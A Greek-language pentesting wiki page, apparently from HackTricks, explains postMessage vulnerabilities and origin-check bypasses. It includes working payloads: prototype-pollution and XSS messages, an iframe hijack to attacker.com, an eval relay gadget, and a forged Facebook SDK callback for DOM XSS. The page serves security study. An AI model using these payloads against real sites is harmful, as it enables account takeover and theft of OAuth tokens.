# PostMessage Ευπάθειες

{{#include ../../banners/hacktricks-training.md}}

## Αποστολή **PostMessage**

**PostMessage** χρησιμοποιεί την παρακάτω συνάρτηση για να στείλει ένα μήνυμα:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Σημειώστε ότι το **targetOrigin** μπορεί να είναι '\*' ή ένα URL όπως _https://company.com._\
Στο **δεύτερο σενάριο**, το **μήνυμα μπορεί να σταλεί μόνο σε αυτόν τον domain** (ακόμη και αν το origin του Window object είναι διαφορετικό).\
Εάν χρησιμοποιηθεί το **wildcard**, **τα μηνύματα μπορούν να σταλούν σε οποιονδήποτε domain**, και θα σταλούν στο origin του Window object.

### Επίθεση σε iframe & wildcard στο **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
Σημειώστε ότι αν η σελίδα μπορεί να είναι iframed αλλά το **targetOrigin** είναι **set to a URL and not to a wildcard**, αυτό **κόλπο δεν θα λειτουργήσει**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** είναι η συνάρτηση που χρησιμοποιείται από το JS για να δηλώσει τη συνάρτηση που **περιμένει `postMessages`**.\
Θα χρησιμοποιηθεί κώδικας παρόμοιος με τον παρακάτω:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Σημειώστε σε αυτή την περίπτωση πώς το **πρώτο πράγμα** που κάνει ο κώδικας είναι **έλεγχος του origin**. Αυτό είναι εξαιρετικά **σημαντικό**, κυρίως αν η σελίδα πρόκειται να κάνει **οτιδήποτε ευαίσθητο** με τις ληφθείσες πληροφορίες (π.χ. αλλαγή κωδικού). **Αν δεν ελέγχει το origin, οι επιτιθέμενοι μπορούν να αναγκάσουν τα θύματα να στείλουν αυθαίρετα δεδομένα σε αυτό το endpoint** και να αλλάξουν τους κωδικούς των θυμάτων (σε αυτό το παράδειγμα).

### Enumeration

Για να εντοπίσετε event listeners στη σελίδα μπορείτε να:

- **Search** τον JS κώδικα για `window.addEventListener` και `$(window).on` (_JQuery version_)
- **Execute** στην κονσόλα των developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ στα developer tools του browser

![](<../../images/image (396).png>)

- Χρησιμοποιήστε ένα **browser extension** όπως [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ή [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Αυτά τα browser extensions θα **παρακολουθήσουν όλα τα μηνύματα** και θα σας τα εμφανίσουν.

### Origin check bypasses

- Το attribute **`event.isTrusted`** θεωρείται ασφαλές καθώς επιστρέφει `True` μόνο για events που δημιουργούνται από γνήσιες ενέργειες χρήστη. Παρότι είναι δύσκολο να παρακαμφθεί αν υλοποιηθεί σωστά, η σημασία του σε έλεγχους ασφάλειας είναι αξιοσημείωτη.
- Η χρήση του **`indexOf()`** για validation του origin σε PostMessage events μπορεί να είναι ευπαθής σε bypass. Ένα παράδειγμα που απεικονίζει αυτή την ευπάθεια είναι:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Η μέθοδος **`search()`** από το `String.prototype.search()` προορίζεται για regular expressions, όχι για strings. Η παράδοση οτιδήποτε εκτός από regexp οδηγεί σε implicit μετατροπή σε regex, κάνοντας τη μέθοδο δυνητικά μη ασφαλή. Αυτό οφείλεται στο ότι στο regex, μια τελεία (.) λειτουργεί ως wildcard, επιτρέποντας την παράκαμψη του validation με ειδικά κατασκευασμένα domains. Για παράδειγμα:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Η λειτουργία **`match()`**, παρόμοια με το `search()`, επεξεργάζεται regex. Αν το regex είναι δομημένο λανθασμένα, μπορεί να είναι επιδεκτικό σε παράκαμψη.
- Η συνάρτηση **`escapeHtml`** προορίζεται να sanitize εισόδους με escaping χαρακτήρων. Ωστόσο, δεν δημιουργεί νέο escaped αντικείμενο αλλά αντικαθιστά τις ιδιότητες του υπάρχοντος αντικειμένου. Αυτή η συμπεριφορά μπορεί να εκμεταλλευθεί. Ειδικά, αν ένα αντικείμενο μπορεί να χειραγωγηθεί έτσι ώστε η ελεγχόμενη ιδιότητά του να μην αναγνωρίζει το `hasOwnProperty`, το `escapeHtml` δεν θα λειτουργήσει όπως αναμένεται. Αυτό αποδεικνύεται στα παρακάτω παραδείγματα:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Στο πλαίσιο αυτής της ευπάθειας, το αντικείμενο `File` είναι αξιοσημείωτα εκμεταλλεύσιμο λόγω της read-only ιδιότητας `name`. Αυτή η ιδιότητα, όταν χρησιμοποιείται σε templates, δεν υποβάλλεται σε escaping από τη `escapeHtml`, οδηγώντας σε πιθανούς κινδύνους ασφάλειας.

- Η ιδιότητα `document.domain` στο JavaScript μπορεί να οριστεί από ένα script για να κοντύνει το domain, επιτρέποντας πιο χαλαρή εφαρμογή της same-origin policy εντός του ίδιου parent domain.

### Origin-only trust + trusted relays

Αν ένας receiver ελέγχει μόνο το **`event.origin`** (π.χ. εμπιστεύεται οποιοδήποτε `*.trusted.com`) συχνά μπορείτε να βρείτε μια **"relay" page στο αυτό το origin που αντανακλά παραμέτρους ελεγχόμενες από attacker μέσω `postMessage`** σε ένα δοθέν `targetOrigin`/`targetWindow`. Παραδείγματα περιλαμβάνουν marketing/analytics gadgets που παίρνουν query params και προωθούν `{msg_type, access_token, ...}` στο `opener`/`parent`. Μπορείτε να:

- **Open the victim page in a popup/iframe that has an `opener`** ώστε να εγγραφούν οι handlers (πολλά pixels/SDKs επισυνάπτουν listeners μόνο όταν το `window.opener` υπάρχει).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, συμπληρώνοντας τα πεδία μηνύματος που θέλετε να εγχυθούν (message type, tokens, nonces).
- Επειδή το μήνυμα τώρα προέρχεται **από το trusted origin**, ο έλεγχος μόνο του origin περνάει και μπορείτε να ενεργοποιήσετε privileged συμπεριφορές (state changes, API calls, DOM writes) στον listener του θύματος.

Μοτίβα κατάχρησης που έχουν παρατηρηθεί στην πράξη:

- Analytics SDKs (π.χ. pixel/fbevents-style) καταναλώνουν μηνύματα όπως `FACEBOOK_IWL_BOOTSTRAP`, και στη συνέχεια **καλούν backend APIs χρησιμοποιώντας ένα token που παρέχεται στο μήνυμα** και συμπεριλαμβάνουν **`location.href` / `document.referrer`** στο σώμα του αιτήματος. Αν παρέχετε το δικό σας token, μπορείτε να **διαβάσετε αυτά τα αιτήματα στο ιστορικό/logs των αιτήσεων του token** και να εξαγάγετε **OAuth codes/tokens** που υπάρχουν στο URL/referrer της σελίδας του θύματος.
- Οποιοδήποτε relay που καθρεφτίζει αυθαίρετα πεδία στο `postMessage` σας επιτρέπει να **spoof message types** που αναμένονται από privileged listeners. Συνδυάστε με αδύναμο input validation για να φτάσετε σε Graph/REST κλήσεις, feature unlocks, ή ροές ισοδύναμες με CSRF.

Συμβουλές ανίχνευσης: enumerate `postMessage` listeners που ελέγχουν μόνο το `event.origin`, και μετά ψάξτε για **same-origin HTML/JS endpoints που προωθούν URL params μέσω `postMessage`** (marketing previews, login popups, OAuth error pages). Συνδέστε και τα δύο με `window.open()` + `postMessage` για να παρακάμψετε τους ελέγχους origin.

### e.origin == window.origin bypass

Όταν ενσωματώνετε μια web σελίδα μέσα σε ένα **sandboxed iframe** χρησιμοποιώντας %%%%%%, είναι κρίσιμο να κατανοήσετε ότι το origin του iframe θα οριστεί σε null. Αυτό είναι ιδιαίτερα σημαντικό όταν χειρίζεστε τα **sandbox attributes** και τις επιπτώσεις τους στην ασφάλεια και τη λειτουργικότητα.

Καθορίζοντας **`allow-popups`** στο sandbox attribute, οποιοδήποτε popup ανοίγει από το iframe κληρονομεί τους περιορισμούς sandbox του parent. Αυτό σημαίνει ότι εκτός αν το attribute **`allow-popups-to-escape-sandbox`** περιλαμβάνεται επίσης, το origin του popup θα οριστεί ανάλογα σε `null`, ευθυγραμμιζόμενο με το origin του iframe.

Κατά συνέπεια, όταν ένα popup ανοίγει υπό αυτές τις συνθήκες και ένα μήνυμα στέλνεται από το iframe στο popup χρησιμοποιώντας **`postMessage`**, τόσο ο αποστολέας όσο και ο δέκτης έχουν τα origin τους ορισμένα σε `null`. Αυτή η κατάσταση οδηγεί στο σενάριο όπου **`e.origin == window.origin`** αξιολογείται ως true (`null == null`), επειδή τόσο το iframe όσο και το popup μοιράζονται την ίδια τιμή origin `null`.

Για περισσότερες πληροφορίες **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Παράκαμψη e.source

Είναι δυνατόν να ελεγχθεί αν το μήνυμα προήλθε από το ίδιο window στο οποίο ακούει το script (ειδικά ενδιαφέρον για **Content Scripts from browser extensions** που θέλουν να ελέγξουν αν το μήνυμα στάλθηκε από την ίδια σελίδα):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Μπορείτε να αναγκάσετε το **`e.source`** ενός μηνύματος να είναι null δημιουργώντας ένα **iframe** που **στέλνει** το **postMessage** και διαγράφεται **αμέσως**.

Για περισσότερες πληροφορίες **διαβάστε:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Για να εκτελέσετε αυτές τις επιθέσεις, ιδανικά θα πρέπει να μπορείτε να **βάλετε τη σελίδα του θύματος** μέσα σε ένα `iframe`. Αλλά κάποια headers όπως το `X-Frame-Header` μπορούν να **αποτρέψουν** αυτή τη **συμπεριφορά**.\
Σε αυτά τα σενάρια μπορείτε ακόμα να χρησιμοποιήσετε μια λιγότερο stealthy επίθεση. Μπορείτε να ανοίξετε μια νέα καρτέλα προς την ευάλωτη web εφαρμογή και να επικοινωνήσετε μαζί της:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Κλοπή μηνύματος που στέλνεται σε child iframe αποκλείοντας την κύρια σελίδα

Στην παρακάτω σελίδα μπορείτε να δείτε πώς θα μπορούσατε να κλέψετε **ευαίσθητα postmessage δεδομένα** που αποστέλλονται σε ένα **child iframe** αποκλείοντας την **main** σελίδα πριν την αποστολή των δεδομένων και εκμεταλλευόμενοι ένα **XSS στο child** για να **leak** τα δεδομένα πριν αυτά παραληφθούν:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Κλοπή μηνύματος με τροποποίηση του location του iframe

Αν μπορείτε να iframe μια ιστοσελίδα χωρίς X-Frame-Header που περιέχει άλλο iframe, μπορείτε να **αλλάξετε το location αυτού του child iframe**, οπότε αν λαμβάνει ένα **postmessage** που στέλνεται με χρήση **wildcard**, ένας επιτιθέμενος θα μπορούσε να **αλλάξει** την **origin** αυτού του iframe σε μια σελίδα **controlled** από αυτόν και να **steal** το μήνυμα:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage προς Prototype Pollution και/ή XSS

Σε σενάρια όπου τα δεδομένα που στέλνονται μέσω `postMessage` εκτελούνται από JS, μπορείτε να **iframe** τη **σελίδα** και να **εκμεταλλευτείτε** την **prototype pollution/XSS** στέλνοντας το exploit μέσω `postMessage`.

Μερικά **πολύ καλά εξηγημένα XSS μέσω του `postMessage`** μπορούν να βρεθούν στο [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Παράδειγμα ενός exploit για την εκμετάλλευση της **Prototype Pollution και στη συνέχεια XSS** μέσω ενός `postMessage` προς ένα `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Για **περισσότερες πληροφορίες**:

- Σύνδεσμος στη σελίδα σχετικά με [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Σύνδεσμος στη σελίδα σχετικά με [**XSS**](../xss-cross-site-scripting/index.html)
- Σύνδεσμος στη σελίδα σχετικά με [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Trusted-origin allowlist δεν αποτελεί όριο

Ένας αυστηρός έλεγχος του `event.origin` λειτουργεί μόνο εάν ο **trusted origin δεν μπορεί να εκτελέσει attacker JS**. Όταν privileged pages ενθέτουν third-party iframes και υποθέτουν ότι `event.origin === "https://partner.com"` είναι ασφαλές, οποιοδήποτε XSS στο `partner.com` γίνεται γέφυρα προς τον parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Μοτίβο επίθεσης που παρατηρήθηκε σε πραγματικές συνθήκες:

1. **Exploit XSS in the partner iframe** και drop a relay gadget ώστε οποιοδήποτε `postMessage` να γίνεται code exec μέσα στο trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, στείλτε JS στο συμβιβασμένο iframe που προωθεί έναν επιτρεπόμενο τύπο μηνύματος πίσω στον parent. Το μήνυμα προέρχεται από `partner.com`, περνάει το allowlist, και περιέχει HTML που εισάγεται ανασφαλώς:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Ο parent εισάγει το attacker HTML, δίνοντας **JS execution in the parent origin** (π.χ., `facebook.com`), το οποίο μπορεί στη συνέχεια να χρησιμοποιηθεί για να κλέψει OAuth codes ή να κάνει pivot σε πλήρεις ροές account takeover.

Key takeaways:

- **Partner origin isn't a boundary**: οποιαδήποτε XSS σε έναν "trusted" partner επιτρέπει σε attackers να στέλνουν επιτρεπόμενα μηνύματα που παρακάμπτουν τους ελέγχους `event.origin`.
- Handlers που **render partner-controlled payloads** (π.χ., `innerHTML` σε συγκεκριμένους τύπους μηνυμάτων) μετατρέπουν την compromise του partner σε same-origin DOM XSS.
- Μια ευρεία **message surface** (πολλοί τύποι, χωρίς έλεγχο δομής) δίνει περισσότερα gadgets για pivoting μόλις compromised ένα partner iframe.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Όταν η επικύρωση μηνυμάτων χρησιμοποιεί ένα “shared secret” που δημιουργείται με `Math.random()` (π.χ., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) και ο ίδιος helper ονομάζει επίσης plugin iframes, μπορείτε να ανακτήσετε PRNG outputs και να πλαστογραφήσετε trusted messages:

- **Leak PRNG outputs via `window.name`:** Το SDK ονομάζει αυτόματα τα plugin iframes με `guid()`. Αν έχετε control στο top frame, κάντε iframe τη victim page, μετά πλοηγείστε το plugin iframe στην origin σας (π.χ., `window.frames[0].frames[0].location='https://attacker.com'`) και διαβάστε `window.frames[0].frames[0].name` για να αποκτήσετε ένα raw `Math.random()` output.
- **Force more outputs without reloads:** Κάποια SDKs εκθέτουν ένα reinit path; στο FB SDK, firing `init:post` με `{xfbml:1}` αναγκάζει `XFBML.parse()`, καταστρέφει/επαναδημιουργεί το plugin iframe, και δημιουργεί νέα ονόματα/IDs callback. Επαναλαμβανόμενο reinit παράγει όσα PRNG outputs χρειάζονται (σημειώστε πρόσθετες εσωτερικές κλήσεις `Math.random()` για callback/iframe IDs, οπότε οι solvers πρέπει να παραλείπουν διαμεσολαβούντες τιμές).
- **Trusted-origin delivery via parameter pollution:** Αν ένα first-party plugin endpoint αντανακλά έναν μη-επεξεργασμένο parameter στο cross-window payload (π.χ., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), μπορείτε να εισάγετε `&type=...&iconSVG=...` ενώ διατηρείτε το trusted `facebook.com` origin.
- **Predict the next callback:** Μετατρέψτε leaked iframe names πίσω σε floats στο `[0,1)` και τροφοδοτήστε αρκετές τιμές (ακόμα και μη-συνεχόμενες) σε έναν V8 `Math.random` predictor (π.χ., Z3-based). Γεννήστε το επόμενο `guid()` τοπικά για να πλαστογραφήσετε το αναμενόμενο callback token.
- **Trigger the sink:** Κατασκευάστε τα postMessage δεδομένα ώστε η bridge να dispatchάρει `xd.mpn.setupIconIframe` και να injectάρει HTML στο `iconSVG` (π.χ., URL-encoded `<img src=x onerror=...>`), πετυχαίνοντας DOM XSS μέσα στο hosting origin· από εκεί, same-origin iframes (OAuth dialogs, arbiters, κ.λπ.) μπορούν να διαβαστούν.
- **Framing quirks help:** Η αλυσίδα απαιτεί framing. Σε κάποια mobile webviews, το `X-Frame-Options` μπορεί να υποβαθμιστεί σε μη-υποστηριζόμενο `ALLOW-FROM` όταν υπάρχει `frame-ancestors`, και παράμετροι “compat” μπορούν να επιβάλλουν επιτρεπτικούς `frame-ancestors`, επιτρέποντας το `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Αναφορές

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Για εξάσκηση: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
